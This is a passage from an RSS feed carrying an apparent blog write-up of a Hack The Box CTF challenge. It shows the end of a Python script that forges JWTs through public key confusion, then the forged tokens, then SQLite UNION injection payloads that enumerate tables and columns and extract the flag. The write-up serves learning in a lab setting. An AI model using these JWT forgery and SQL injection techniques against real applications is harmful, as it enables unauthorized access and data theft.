class=&quot;n&quot;&gt;sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encoded_s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unsigned_jwt&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_s&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To use this script, we simply run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x exploit.py&lt;/code&gt;, and then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./exploit.py &quot;sqli payload&quot;&lt;/code&gt;, and it will generate a valid, maliciously crafted, JWT token for the application! To test if it is working, we will simply pass our username as a payload:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exploit.py &lt;span class=&quot;s2&quot;&gt;&quot;mula&quot;&lt;/span&gt;
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJtdWxhIiwgInBrIjogIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4ifQ.qE9eS5hAKyvxgcVyh4Ne26-GNklpuDVNli4VkDeSYRQ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This JWT must log us in as mula:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc13.png&quot; alt=&quot;crafted jwt response&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, we successfuly logged in, proving the public key confusion vulnerability is present! To check if the server is vulnerable to SQL injection, we will use the following payload:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exploit.py &lt;span class=&quot;s2&quot;&gt;&quot;&apos; union SELECT ;--&quot;&lt;/span&gt;
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIFNFTEVDVCA7LS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.DucJUAHb7T7y4mjQltzMcgQaDodL1E7VcWAgruIiJnQ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This should produce a syntax error, since we are not selecting anything:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc14.png&quot; alt=&quot;sql error&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;Alright! Now we need to solve this bad boy. We still don’t know where the flag is, but with a SQL injection we are able to enumerate the database tables and hopefully find the flag. The following payload is used for identifying the number of columns of first select statement: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1,1,...,1-- -&lt;/code&gt;, where the number of ones in the injection is the number of columns. We try this until we don’t get an error from the application. After attempting with (1), (1,1) and (1,1,1), we find that the number of columns is 3. The payload is:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exploit.py &lt;span class=&quot;s2&quot;&gt;&quot;&apos; union select 1,1,1-- -&quot;&lt;/span&gt;
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIHNlbGVjdCAxLDEsMS0tIC0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.y9yJbvfy0ARuq-hmEuYxSGJHcF5h1q3BonCf77iHi_c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we need to find which columns are being retrieved by the application. To do so, we change our payload to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1,2,3-- -&lt;/code&gt;. Since the application returns the username back to us extracted from the token, this union select statement will print out the username column number. The respons to this paylod is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc15.png&quot; alt=&quot;second payload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the username column is the second one. This is important to know because this column is what the application displays in clear text for us. If we want it to print the flag, we will need to inject the flag payload in this position.&lt;/p&gt;

&lt;p&gt;Now, to retrieve all the tables, we need to select the table names in the 2nd column position. With help of &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name&quot;&gt;PayloadAllTheThings&lt;/a&gt;, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1, group_concat(tbl_name), 3 from sqlite_master where type=&apos;table&apos; and tbl_name NOT like &apos;sqlite_%&apos;-- -&lt;/code&gt;. This will fetch all tables in the database:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc17.png&quot; alt=&quot;third payload fetching table name&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the table name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag_storage&lt;/code&gt;. Now, we need to extract the column name. This payload should work: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1, sql, 3 from sqlite_master where type!=&apos;meta&apos; and sql not null and name=&apos;flag_storage&apos;-- -&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc18.png&quot; alt=&quot;retrieving column name&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, to retrieve the flag, we simply use this paylaod &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1, top_secret_flaag, 3 from flag_storage-- -&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc19.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there is our flag!!!&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;This CTF provided an awesome experience. It involved two vulnerabilities, requiring careful and critical thinking. We learned a lot about SQLite injection and one of the many JWT vulnerabilities that exist out there. This challenge is an example of how things can go wrong due to a chain of vulnerabilities.&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 03 Jan 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//under-construction-htb</link>
        <link href="http://localhost:4000/under-construction-htb"/>
        <guid isPermaLink="true">http://localhost:4000/under-construction-htb</guid>
      </item>
    
  </channel>
</rss>
